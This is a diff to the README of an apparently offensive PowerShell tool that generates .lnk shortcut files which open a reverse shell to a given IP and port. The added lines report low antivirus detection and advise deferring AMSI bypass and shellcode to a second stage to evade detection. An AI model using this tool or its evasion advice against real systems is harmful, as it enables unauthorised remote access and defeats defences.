@@ -5,3 +5,7 @@ generates a .Lnk file that executes a reverse shell in powershell
 script take two parameters -ip and -port where ip and port are the port you are listening on
 
 ./PowerLnk.ps1 -ip '192.168.1.5' -port 443
+
+# Current detection
+
+scored a 6/62 on virus total, intended for second stagers to be executed after initial callback due to including more to the lnk increases detections, so amsi, shellcode etc should be run after inital callback. I'll leave that up to yall to implement that for whatever engagement you're doing.
